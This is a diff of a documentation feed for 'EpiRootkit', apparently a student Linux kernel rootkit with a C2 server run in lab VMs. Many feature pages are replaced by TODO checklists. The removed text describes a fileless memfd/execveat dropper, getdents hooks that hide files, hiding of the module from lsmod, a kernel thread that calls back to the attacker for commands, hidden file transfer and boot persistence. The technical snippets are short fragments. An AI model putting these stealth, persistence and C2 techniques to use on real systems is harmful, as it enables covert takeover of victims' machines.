+&lt;p>Paste this value into your &lt;code>.env&lt;/code> as &lt;code>ENCRYPTION_KEY&lt;/code>.&lt;/p></description></item><item><title>Security Features</title><link>/docs/03-attacking-program/security/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/security/</guid><description>&lt;h2 id="todo-implement-security-features">TODO: Implement Security Features &lt;a href="#todo-implement-security-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Enforce end-to-end encryption for all C2 traffic&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Add configurable password policies&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement multi-factor authentication for operators&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Add rate limiting and brute-force protection&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Document all security mechanisms in detail&lt;/li>
 &lt;/ul>
-&lt;h2 id="other-settings">Other Settings &lt;a href="#other-settings" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;code>WEB_PORT&lt;/code>: For a potential future web UI (Default: &lt;code>3000&lt;/code>).&lt;/li>
-&lt;li>&lt;code>UPLOAD_DIR&lt;/code>, &lt;code>DOWNLOAD_DIR&lt;/code>, &lt;code>LOG_DIR&lt;/code>: Default paths for server-side file operations and logs.&lt;/li>
-&lt;/ul>
-&lt;p>Configuration validation ensures key formats (e.g., key lengths) are correct on startup.&lt;/p></description></item><item><title>Security Features</title><link>/docs/03-attacking-program/security/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/03-attacking-program/security/</guid><description>&lt;p>The C2 server employs two main security mechanisms:&lt;/p>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p>
+&lt;p>The C2 server employs two main security mechanisms:&lt;/p>
 &lt;h2 id="1-message-encryption-aes-256-gcm">1. Message Encryption: AES-256-GCM &lt;a href="#1-message-encryption-aes-256-gcm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
 &lt;li>Purpose: Encrypts all TCP C2 traffic for confidentiality, integrity, and authenticity.&lt;/li>
 &lt;li>Key: Uses a 32-byte &lt;code>ENCRYPTION_KEY&lt;/code> (must be changed from default and kept secret).&lt;/li>
 &lt;li>Format: Encrypted messages are transmitted as a colon-separated string: &lt;code>iv_hex:authtag_hex:ciphertext_hex&lt;/code>.&lt;/li>
-&lt;li>Details: See &lt;code>src/utils/encryption.js&lt;/code> and &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/configuration/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p>&lt;strong>Configuration&lt;/strong>&lt;br>Key C2 server configuration settings.&lt;/a>" data-bs-toggle="tooltip" href="/docs/03-attacking-program/configuration/">Configuration&lt;/a>.&lt;/li>
-&lt;/ul>
-&lt;h2 id="2-client-authentication-sha512-hashing">2. Client Authentication: SHA512 Hashing &lt;a href="#2-client-authentication-sha512-hashing" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>Purpose: Verifies EpiRootkit clients before allowing interaction.&lt;/li>
-&lt;li>Method: Client sends a password; server hashes it with SHA512 and compares against a stored &lt;code>PASSWORD_HASH&lt;/code>.&lt;/li>
-&lt;li>Hash: The &lt;code>PASSWORD_HASH&lt;/code> (must be changed from default) is a 128-char lowercase SHA512 hex string.&lt;/li>
-&lt;li>Details: See &lt;code>src/handlers/messageHandlers.js&lt;/code> and &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/configuration/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Configuration Justifications</title><link>/docs/04-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/configuration-justifications/</guid><description>&lt;div class="alert alert-info d-flex" role="alert">
+&lt;li>Details: See &lt;code>src/utils/encryption.js&lt;/code> and &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/configuration/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Configuration Justifications</title><link>/docs/04-epirootkit/configuration-justifications/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/configuration-justifications/</guid><description>&lt;div class="alert alert-info d-flex" role="alert">
  &lt;div class="flex-shrink-1 alert-icon">
  
  &lt;span class="material-icons size-20 me-2">
@@ -499,22 +455,17 @@ echo -n &amp;#34;your_new_strong_password&amp;#34; | sha512sum | awk &amp;#39;{p
  &lt;/div>
 &lt;ol>
 &lt;li>
-&lt;p>&lt;strong>Full ftrace support&lt;/strong>&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/04-epirootkit/connection-authentication/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/04-epirootkit/connection-authentication/</guid><description>&lt;p>For the EpiRootkit to be controlled, it must first establish a connection to the Attacking Program (C2 Server) and then authenticate itself.&lt;/p>
-&lt;h2 id="connection-to-c2-server">Connection to C2 Server &lt;a href="#connection-to-c2-server" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
-&lt;li>
-&lt;p>&lt;strong>Target&lt;/strong>: The EpiRootkit needs to know the IP address and port of the C2 server.&lt;/p>
-&lt;ul>
-&lt;li>This information might be hardcoded during compilation, passed as a module parameter during loading, or discovered through other means.&lt;/li>
-&lt;li>The C2 server, by default, listens on port &lt;code>4444&lt;/code> (configurable, see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/configuration/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Deployment</title><link>/docs/04-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/deployment/</guid><description>&lt;p>Instructions on how to compile the module (&lt;code>Makefile&lt;/code>) and load it into the kernel (&lt;code>insmod&lt;/code>/&lt;code>modprobe&lt;/code>).&lt;/p></description></item><item><title>Security Interaction with C2</title><link>/docs/04-epirootkit/security-interaction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/04-epirootkit/security-interaction/</guid><description>&lt;p>To maintain a secure channel and controlled access, the EpiRootkit must adhere to the security protocols established by the Attacking Program (C2 Server).&lt;/p>
-&lt;h2 id="1-encrypted-communication-aes-256-gcm">1. Encrypted Communication (AES-256-GCM) &lt;a href="#1-encrypted-communication-aes-256-gcm" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>&lt;strong>Requirement&lt;/strong>: All TCP communication with the C2 server &lt;strong>must&lt;/strong> be encrypted using AES-256-GCM.&lt;/li>
-&lt;li>&lt;strong>Shared Secret&lt;/strong>: The EpiRootkit must be compiled or configured with the exact same 32-byte &lt;code>ENCRYPTION_KEY&lt;/code> that the C2 server is using (see &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/03-attacking-program/security/'>&lt;p>ATTACKING PROGRAM (C2 SERVER)&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/command-execution/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/04-epirootkit/command-execution/</guid><description>&lt;p>Once authenticated, the EpiRootkit can receive commands from the C2 server, execute them on the victim machine, and return the results.&lt;/p>
-&lt;h2 id="receiving-commands">Receiving Commands &lt;a href="#receiving-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
-&lt;li>&lt;strong>Command Message (&lt;code>COMMAND&lt;/code>)&lt;/strong>:
-&lt;ul>
-&lt;li>The C2 server sends commands to an authenticated EpiRootkit client using a &lt;code>COMMAND&lt;/code> message.&lt;/li>
-&lt;li>&lt;strong>Format&lt;/strong>: A JSON object, encrypted using AES-256-GCM.
-
+&lt;p>&lt;strong>Full ftrace support&lt;/strong>&lt;/p></description></item><item><title>Connection &amp; Authentication</title><link>/docs/04-epirootkit/connection-authentication/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/04-epirootkit/connection-authentication/</guid><description>&lt;h2 id="todo-implement-connection--authentication-features">TODO: Implement Connection &amp;amp; Authentication Features &lt;a href="#todo-implement-connection--authentication-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Establish TCP connection to C2 server&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement persistent reconnection logic&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Add secure authentication handshake&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Handle authentication failures and retries&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Document connection protocol and error handling&lt;/li>
+&lt;/ul>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Deployment</title><link>/docs/04-epirootkit/deployment/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/deployment/</guid><description>&lt;h1 id="epirootkit-deployment">EpiRootkit Deployment &lt;a href="#epirootkit-deployment" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;blockquote>
+&lt;p>&lt;strong>Assumption:&lt;/strong> You are starting from a fresh Ubuntu 20.04 VM. Complete &lt;a data-bs-delay="{&amp;#34;hide&amp;#34;:300,&amp;#34;show&amp;#34;:550}" data-bs-html="true" data-bs-title="&lt;a href='/docs/02-setup/vm-installation/'>&lt;p>SETUP&lt;/p>&lt;strong>VM Installation &amp; Verification&lt;/strong>&lt;br>Set up and verify the attacker and victim VMs from scratch.&lt;/a>" data-bs-toggle="tooltip" href="/docs/02-setup/vm-installation/">VM Installation&lt;/a> first.&lt;/p>
+&lt;/blockquote>
+&lt;h2 id="1-install-build-tools-and-kernel-headers">1. Install Build Tools and Kernel Headers &lt;a href="#1-install-build-tools-and-kernel-headers" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>
 
 
  
@@ -529,73 +480,13 @@ echo -n &amp;#34;your_new_strong_password&amp;#34; | sha512sum | awk &amp;#39;{p
  
 
  &lt;div class="prism-codeblock ">
- &lt;pre id="025e6d1" class="language-json ">
- &lt;code>{
- &amp;#34;type&amp;#34;: &amp;#34;COMMAND&amp;#34;,
- &amp;#34;id&amp;#34;: &amp;#34;unique_command_id_string&amp;#34;, // e.g., a timestamp
- &amp;#34;data&amp;#34;: &amp;#34;command_string_to_execute&amp;#34; // e.g., &amp;#34;ls -la /tmp&amp;#34; or &amp;#34;whoami&amp;#34;
-}&lt;/code>
+ &lt;pre id="69caee5" class="language-bash ">
+ &lt;code>sudo apt update
+sudo apt install -y build-essential linux-headers-$(uname -r) git&lt;/code>
  &lt;/pre>
  &lt;/div>
-&lt;/li>
-&lt;li>The &lt;code>id&lt;/code> is a unique identifier generated by the C2 server for tracking the command.&lt;/li>
-&lt;li>The &lt;code>data&lt;/code> field contains the raw command string that the EpiRootkit should execute.&lt;/li>
-&lt;/ul>
-&lt;/li>
-&lt;/ol>
-&lt;h2 id="executing-commands">Executing Commands &lt;a href="#executing-commands" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
-&lt;li>The EpiRootkit is responsible for parsing the &lt;code>data&lt;/code> field and executing the command on the victim system.&lt;/li>
-&lt;li>It needs to capture:
-&lt;ul>
-&lt;li>Standard Output (stdout) of the command.&lt;/li>
-&lt;li>Standard Error (stderr) of the command.&lt;/li>
-&lt;li>The exit status (or exit code) of the command.&lt;/li>
-&lt;/ul>
-&lt;/li>
-&lt;/ul>
-&lt;h2 id="returning-results">Returning Results &lt;a href="#returning-results" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ol>
-&lt;li>
-&lt;p>&lt;strong>Command Result Message (&lt;code>COMMAND_RESULT&lt;/code>)&lt;/strong>:&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/features/command-execution/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/command-execution/</guid><description>&lt;p>How commands are executed on the victim and results returned.&lt;/p></description></item><item><title>Connection</title><link>/docs/04-epirootkit/features/connection/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/connection/</guid><description>&lt;p>Details about the connection mechanism (how it connects back, retries).&lt;/p></description></item><item><title>Crypto</title><link>/docs/04-epirootkit/features/crypto/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/crypto/</guid><description>&lt;p>Details on the encryption used for communication.&lt;/p></description></item><item><title>Remote Exec &amp; File Transfer</title><link>/docs/04-epirootkit/features/file-transfer/</link><pubDate>Sun, 11 May 2025 18:35:00 +0100</pubDate><guid>/docs/04-epirootkit/features/file-transfer/</guid><description>&lt;h1 id="1-remote-command-execution">1. Remote Command Execution &lt;a href="#1-remote-command-execution" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
-Allow arbitrary program execution via C2.&lt;/p>
-&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
-&lt;ul>
-&lt;li>Receive a packet:
+&lt;blockquote>
 
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="265fa6f" class="language- ">
- &lt;code>EXEC &amp;lt;len&amp;gt;\n&amp;lt;payload&amp;gt;&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>Use &lt;code>call_usermodehelper(argv, envp, UMH_WAIT_PROC)&lt;/code> to spawn the process.&lt;/li>
-&lt;li>Capture its &lt;code>stdout&lt;/code>/&lt;code>stderr&lt;/code> via kernel pipes and send back encrypted.&lt;/li>
-&lt;/ul>
-&lt;hr>
-&lt;h1 id="2-file-upload">2. File Upload &lt;a href="#2-file-upload" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
-Accept files from the attacker.&lt;/p>
-&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
-&lt;ul>
-&lt;li>Receive &lt;code>UPLOAD &amp;lt;path&amp;gt; &amp;lt;len&amp;gt;\n&amp;lt;data&amp;gt;&lt;/code>.&lt;/li>
-&lt;li>&lt;code>filp_open(&amp;quot;/usr/share/epirootkit/&amp;lt;path&amp;gt;&amp;quot;, O_CREAT|O_WRONLY, 0600)&lt;/code>.&lt;/li>
-&lt;li>&lt;code>kernel_write()&lt;/code> the data.&lt;/li>
-&lt;li>Our &lt;code>getdents()&lt;/code> hook keeps &lt;code>/usr/share/epirootkit&lt;/code> hidden.&lt;/li>
-&lt;/ul>
-&lt;hr>
-&lt;h1 id="3-file-download">3. File Download &lt;a href="#3-file-download" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
-Send files to the attacker.&lt;/p></description></item><item><title>Fileless Dropper &amp; Rootkit Loader</title><link>/docs/04-epirootkit/features/fileless-dropper-loader/</link><pubDate>Sun, 11 May 2025 18:15:00 +0100</pubDate><guid>/docs/04-epirootkit/features/fileless-dropper-loader/</guid><description>&lt;h1 id="stage-1-fileless-memfd-dropper">Stage 1: Fileless Memfd Dropper &lt;a href="#stage-1-fileless-memfd-dropper" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>
 &lt;div class="alert alert-info d-flex" role="alert">
  &lt;div class="flex-shrink-1 alert-icon">
  
@@ -603,261 +494,107 @@ Send files to the attacker.&lt;/p></description></item><item><title>Fileless Dro
  info
  &lt;/span>&lt;/div>
  
- &lt;div class="w-100">We stage both loader and cron stub entirely in memory&amp;ndash;no on-disk binaries.&lt;/div>
+ &lt;div class="w-100">Check your kernel version with &lt;code>uname -r&lt;/code>. The headers must match exactly!&lt;/div>
  &lt;/div>
-&lt;ol>
-&lt;li>We call
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="8c2bc79" class="language-c ">
- &lt;code>fd_loader = memfd_create(&amp;#34;loader&amp;#34;, MFD_CLOEXEC);
-fd_target = memfd_create(&amp;#34;target&amp;#34;, MFD_CLOEXEC);&lt;/code>
- &lt;/pre>
- &lt;/div>
-to get two anonymous file descriptors.&lt;/li>
-&lt;li>We &lt;code>write()&lt;/code> our embedded ELF blobs into each fd.&lt;/li>
-&lt;li>We &lt;code>fork()&lt;/code>:
+&lt;/blockquote>
+&lt;h2 id="2-clone-or-copy-the-project">2. Clone or Copy the Project &lt;a href="#2-clone-or-copy-the-project" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;p>If not already present, copy the &lt;code>rootkit/&lt;/code> directory into your VM, or clone your repository.&lt;/p></description></item><item><title>Security Interaction with C2</title><link>/docs/04-epirootkit/security-interaction/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/04-epirootkit/security-interaction/</guid><description>&lt;h2 id="todo-implement-security-interaction-features">TODO: Implement Security Interaction Features &lt;a href="#todo-implement-security-interaction-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Enforce encrypted communication for all C2 interactions&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement strict authentication and authorization checks&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Add protocol validation and error handling&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Document all security protocols and best practices&lt;/li>
+&lt;/ul>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/command-execution/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>/docs/04-epirootkit/command-execution/</guid><description>&lt;h2 id="todo-implement-command-execution-features">TODO: Implement Command Execution Features &lt;a href="#todo-implement-command-execution-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Parse and validate incoming command messages&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Execute commands securely in kernel/user space&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Capture and return stdout, stderr, and exit code&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Handle command errors and edge cases&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Test command execution end-to-end&lt;/li>
+&lt;/ul>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Command Execution</title><link>/docs/04-epirootkit/features/command-execution/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/command-execution/</guid><description>&lt;h2 id="todo-implement-command-execution-features">TODO: Implement Command Execution Features &lt;a href="#todo-implement-command-execution-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Parse and validate incoming command messages&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Execute commands securely in kernel/user space&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Capture and return stdout, stderr, and exit code&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Handle command errors and edge cases&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Test command execution end-to-end&lt;/li>
+&lt;/ul>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Connection</title><link>/docs/04-epirootkit/features/connection/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/connection/</guid><description>&lt;h2 id="todo-implement-connection-features">TODO: Implement Connection Features &lt;a href="#todo-implement-connection-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Establish and maintain TCP connection to C2&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement reconnection and keepalive logic&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Handle connection errors and timeouts&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Document connection protocol and troubleshooting&lt;/li>
+&lt;/ul>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Crypto</title><link>/docs/04-epirootkit/features/crypto/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/crypto/</guid><description>&lt;h2 id="todo-implement-crypto-features">TODO: Implement Crypto Features &lt;a href="#todo-implement-crypto-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Add AES-256-GCM encryption for all communications&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Securely manage and store encryption keys&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement message authentication and integrity checks&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Document crypto implementation and security considerations&lt;/li>
+&lt;/ul>
+&lt;p>&lt;em>This section will be updated with documentation once features are implemented and tested.&lt;/em>&lt;/p></description></item><item><title>Remote Exec &amp; File Transfer</title><link>/docs/04-epirootkit/features/file-transfer/</link><pubDate>Sun, 11 May 2025 18:35:00 +0100</pubDate><guid>/docs/04-epirootkit/features/file-transfer/</guid><description>&lt;h2 id="todo-implement-file-transfer-features">TODO: Implement File Transfer Features &lt;a href="#todo-implement-file-transfer-features" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h2>&lt;ul>
+&lt;li>&lt;input disabled="" type="checkbox"> Design and implement secure file upload from C2 to rootkit
 &lt;ul>
-&lt;li>&lt;strong>Child&lt;/strong>: redirect stdout/stderr to &lt;code>/dev/null&lt;/code>, then
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="0edd0ef" class="language-c ">
- &lt;code>execveat(fd_loader, NULL, argv_loader, envp, AT_EMPTY_PATH);&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
-&lt;li>&lt;strong>Parent&lt;/strong>: &lt;code>waitpid()&lt;/code>, then
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="169713e" class="language-c ">
- &lt;code>execveat(fd_target, NULL, argv_target, envp, AT_EMPTY_PATH);&lt;/code>
- &lt;/pre>
- &lt;/div>
-&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Define protocol for file upload (message format, chunking, etc.)&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement file write in kernel (e.g., using &lt;code>filp_open&lt;/code>, &lt;code>kernel_write&lt;/code>)&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Handle errors and edge cases (permissions, disk space, etc.)&lt;/li>
 &lt;/ul>
 &lt;/li>
-&lt;/ol>
-&lt;p>&lt;code>execveat(..., AT_EMPTY_PATH)&lt;/code> lets us execute a program by FD without any filename on disk.&lt;/p></description></item><item><title>Stealth Hooks &amp; daniel.* Commands</title><link>/docs/04-epirootkit/features/hiding/</link><pubDate>Sun, 11 May 2025 18:25:00 +0100</pubDate><guid>/docs/04-epirootkit/features/hiding/</guid><description>&lt;h1 id="1-file--directory-hiding">1. File &amp;amp; Directory Hiding &lt;a href="#1-file--directory-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
-We hook &lt;code>getdents()&lt;/code>/&lt;code>getdents64()&lt;/code>.&lt;/p>
-&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
-&lt;ol>
-&lt;li>Call the original syscall to fill a &lt;code>dirent&lt;/code> buffer.&lt;/li>
-&lt;li>Traverse entries; if &lt;code>d_name&lt;/code> starts with any prefix in
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
- &lt;div class="prism-codeblock ">
- &lt;pre id="6c2d135" class="language-c ">
- &lt;code>hide_prefixes[] = { &amp;#34;jules_est_bo_&amp;#34;, &amp;#34;memfd:&amp;#34; };&lt;/code>
- &lt;/pre>
- &lt;/div>
-we drop that entry by &lt;code>memmove()&lt;/code>.&lt;/li>
-&lt;li>Return the new byte count.&lt;/li>
-&lt;/ol>
-&lt;hr>
-&lt;h1 id="2-module-hiding">2. Module Hiding &lt;a href="#2-module-hiding" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
-We hide our LKM from &lt;code>/proc/modules&lt;/code> and &lt;code>lsmod&lt;/code>.&lt;/p>
-&lt;p>&lt;strong>How it works&lt;/strong>&lt;br>
-We hook the procfs &lt;code>iterate&lt;/code> method for &lt;code>/proc/modules&lt;/code> and &lt;code>/sys/modules&lt;/code>, filtering out &lt;code>&amp;quot;epirootkit&amp;quot;&lt;/code> entries.&lt;/p></description></item><item><title>Password Protection</title><link>/docs/04-epirootkit/features/password/</link><pubDate>Wed, 07 May 2025 00:44:31 +0100</pubDate><guid>/docs/04-epirootkit/features/password/</guid><description>&lt;p>How access to the rootkit is secured.&lt;/p></description></item><item><title>Encrypted C2, Persistence &amp; Auth</title><link>/docs/04-epirootkit/features/persistence/</link><pubDate>Sun, 11 May 2025 18:30:00 +0100</pubDate><guid>/docs/04-epirootkit/features/persistence/</guid><description>&lt;h1 id="1-encrypted-c2-heartbeat">1. Encrypted C2 Heartbeat &lt;a href="#1-encrypted-c2-heartbeat" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
-Spawn a kernel thread to poll our C2 server.&lt;/p>
-&lt;p>&lt;strong>How it works&lt;/strong>&lt;/p>
-&lt;ol>
-&lt;li>&lt;code>kthread_run(c2_thread_fn, &amp;amp;cfg, &amp;quot;epic2&amp;quot;)&lt;/code>.&lt;/li>
-&lt;li>Loop:
+&lt;li>&lt;input disabled="" type="checkbox"> Design and implement secure file download from rootkit to C2
 &lt;ul>
-&lt;li>&lt;code>msleep(ping_interval_ms)&lt;/code>.&lt;/li>
-&lt;li>&lt;code>kernel_socket()&lt;/code>, &lt;code>kernel_connect(attacker_ip, port)&lt;/code>.&lt;/li>
-&lt;li>Exchange AES-128-CBC packets using keys from &lt;code>.epirootkit-config&lt;/code>.&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Define protocol for file download (request, chunking, etc.)&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Implement file read in kernel (e.g., using &lt;code>filp_open&lt;/code>, &lt;code>kernel_read&lt;/code>)&lt;/li>
+&lt;li>&lt;input disabled="" type="checkbox"> Stream file data securely to C2&lt;/li>
 &lt;/ul>
 &lt;/li>
-&lt;/ol>
-&lt;hr>
-&lt;h1 id="2-persistence--autoload">2. Persistence &amp;amp; Autoload &lt;a href="#2-persistence--autoload" class="anchor" aria-hidden="true">&lt;i class="material-icons align-middle">link&lt;/i>&lt;/a>&lt;/h1>&lt;p>&lt;strong>What we did&lt;/strong>&lt;br>
-Automatically load on reboot.&lt;/p>
-&lt;p>&lt;strong>How it works&lt;/strong>&lt;br>
-Our &lt;code>installer.sh&lt;/code>:&lt;/p>
-&lt;ol>
-&lt;li>Copies &lt;code>epirootkit.ko&lt;/code> to &lt;code>/lib/modules/$(uname -r)/extra/&lt;/code>.&lt;/li>
-&lt;li>Runs &lt;code>depmod -a&lt;/code>.&lt;/li>
-&lt;li>Writes &lt;code>/etc/modules-load.d/epirootkit.conf&lt;/code> with:
-
-
-
- 
- 
- 
-
- 
- 
- 
- 
-
- 
-
